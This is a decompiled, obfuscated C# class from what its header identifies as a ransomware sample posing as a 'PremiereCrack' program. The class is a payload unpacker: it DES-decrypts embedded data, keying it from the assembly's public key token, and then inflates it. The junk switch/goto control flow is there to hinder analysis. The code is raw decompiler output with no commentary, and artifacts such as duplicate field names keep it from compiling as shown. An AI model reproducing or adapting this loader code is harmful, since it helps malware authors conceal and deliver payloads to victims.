// Decompiled with JetBrains decompiler
// Type: A.W
// Assembly: PremiereCrack, Version=2.3.77.2, Culture=neutral, PublicKeyToken=null
// MVID: B728F238-A35B-46BB-92FD-55CC50CC96B9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.Win32.Generic-27a1f89ce5a37815010c8411dddec85d5d66e81a957ad722fbd2dc64f99651c8.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security;
using System.Security.Cryptography;

namespace A
{
  internal class W
  {
    private static readonly object T;
    private static readonly int T;
    private static readonly int E;
    private static readonly MemoryStream T = HH.T;
    private static readonly MemoryStream E = HH.T;
    private static readonly byte T;

    static W()
    {
      W.T = int.MaxValue;
      W.E = int.MinValue;
      W.T = new MemoryStream(0);
      W.E = new MemoryStream(0);
      W.T = new object();
    }

    private static string T(Assembly T)
    {
      string str = T.FullName;
      int length = str.IndexOf(',');
      if (length >= 0)
      {
label_1:
        switch (7)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (W.T);
            }
            str = str.Substring(0, length);
            break;
        }
      }
      return str;
    }

    private static byte[] T(Assembly T)
    {
      try
      {
        string fullName = T.FullName;
        int num1 = fullName.IndexOf("PublicKeyToken=");
        if (num1 < 0)
        {
label_1:
          switch (5)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (W.T);
              }
              num1 = fullName.IndexOf("publickeytoken=");
              break;
          }
        }
        if (num1 < 0)
        {
label_6:
          switch (7)
          {
            case 0:
              goto label_6;
            default:
              return UH.T;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (fullName[num2] != 'n')
          {
label_9:
            switch (1)
            {
              case 0:
                goto label_9;
              default:
                if (fullName[num2] == 'N')
                {
label_11:
                  switch (5)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] bytes = BitConverter.GetBytes(long.Parse(fullName.Substring(num2, 16), NumberStyles.HexNumber));
                  Array.Reverse((Array) bytes);
                  return bytes;
                }
                break;
            }
          }
          return UH.T;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] T(Stream T)
    {
      lock (W.T)
        return W.E(97L, T);
    }

    internal static byte[] T(long T, Stream E)
    {
      try
      {
        return W.T(E);
      }
      catch (HostProtectionException ex)
      {
        return W.E(97L, E);
      }
    }

    internal static byte[] E(long T, Stream E)
    {
      Stream stream = E;
      MemoryStream memoryStream = HH.T;
      for (int index = 1; index < 4; ++index)
        E.ReadByte();
label_3:
      switch (2)
      {
        case 0:
          goto label_3;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (W.E);
          }
          ushort num1 = ~(ushort) E.ReadByte();
          if (((int) num1 & 2) != 0)
          {
label_7:
            switch (4)
            {
              case 0:
                goto label_7;
              default:
                DESCryptoServiceProvider cryptoServiceProvider = new DESCryptoServiceProvider();
                byte[] buffer1 = WE.T(8);
                E.Read(buffer1, 0, 8);
                cryptoServiceProvider.IV = buffer1;
                byte[] buffer2 = WE.T(8);
                E.Read(buffer2, 0, 8);
                bool flag = true;
                byte[] T1 = buffer2;
                for (int index = 0; index < (int) BE.T(T1); ++index)
                {
                  if (T1[index] != (byte) 0)
                  {
label_10:
                    switch (3)
                    {
                      case 0:
                        goto label_10;
                      default:
                        flag = false;
                        goto label_15;
                    }
                  }
                }
label_14:
                switch (6)
                {
                  case 0:
                    goto label_14;
                }
label_15:
                if (flag)
                {
label_16:
                  switch (1)
                  {
                    case 0:
                      goto label_16;
                    default:
                      buffer2 = W.T(Assembly.GetExecutingAssembly());
                      break;
                  }
                }
                cryptoServiceProvider.Key = buffer2;
                if (W.T == null)
                {
label_19:
                  switch (6)
                  {
                    case 0:
                      goto label_19;
                    default:
                      if (W.T == int.MaxValue)
                      {
label_21:
                        switch (7)
                        {
                          case 0:
                            goto label_21;
                          default:
                            W.T.Capacity = (int) E.Length;
                            break;
                        }
                      }
                      else
                      {
                        W.T.Capacity = W.T;
                        break;
                      }
                      break;
                  }
                }
                W.T.Position = 0L;
                ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor();
                int inputBlockSize = decryptor.InputBlockSize;
                int outputBlockSize = decryptor.OutputBlockSize;
                byte[] numArray1 = WE.T(decryptor.OutputBlockSize);
                byte[] numArray2 = WE.T(decryptor.InputBlockSize);
                int position;
                for (position = (int) E.Position; (long) (position + inputBlockSize) < E.Length; position += inputBlockSize)
                {
                  E.Read(numArray2, 0, inputBlockSize);
                  int count = decryptor.TransformBlock(numArray2, 0, inputBlockSize, numArray1, 0);
                  W.T.Write(numArray1, 0, count);
                }
label_27:
                switch (2)
                {
                  case 0:
                    goto label_27;
                  default:
                    E.Read(numArray2, 0, (int) (E.Length - (long) position));
                    byte[] numArray3 = decryptor.TransformFinalBlock(numArray2, 0, (int) (E.Length - (long) position));
                    W.T.Write(numArray3, 0, (int) BE.T(numArray3));
                    stream = (Stream) W.T;
                    stream.Position = 0L;
                    memoryStream = W.T;
                    break;
                }
                break;
            }
          }
          if (((int) num1 & 8) != 0)
          {
label_30:
            switch (1)
            {
              case 0:
                goto label_30;
              default:
                if (W.E == null)
                {
label_32:
                  switch (7)
                  {
                    case 0:
                      goto label_32;
                    default:
                      if (W.E == int.MinValue)
                      {
label_34:
                        switch (3)
                        {
                          case 0:
                            goto label_34;
                          default:
                            W.E.Capacity = (int) stream.Length * 2;
                            break;
                        }
                      }
                      else
                      {
                        W.E.Capacity = W.E;
                        break;
                      }
                      break;
                  }
                }
                W.E.Position = 0L;
                DeflateStream deflateStream = new DeflateStream(stream, CompressionMode.Decompress);
                int num2 = 1000;
                byte[] buffer = WE.T(num2);
                int count;
                do
                {
                  count = deflateStream.Read(buffer, 0, num2);
                  if (count > 0)
                  {
label_39:
                    switch (2)
                    {
                      case 0:
                        goto label_39;
                      default:
                        W.E.Write(buffer, 0, count);
                        break;
                    }
                  }
                }
                while (count >= num2);
label_42:
                switch (4)
                {
                  case 0:
                    goto label_42;
                  default:
                    memoryStream = W.E;
                    break;
                }
                break;
            }
          }
          if (memoryStream != null)
          {
label_45:
            switch (7)
            {
              case 0:
                goto label_45;
              default:
                return memoryStream.ToArray();
            }
          }
          else
          {
            byte[] numArray = WE.T((int) checked ((IntPtr) unchecked (E.Length - E.Position)));
            E.Read(numArray, 0, (int) BE.T(numArray));
            return numArray;
          }
      }
    }
  }
}
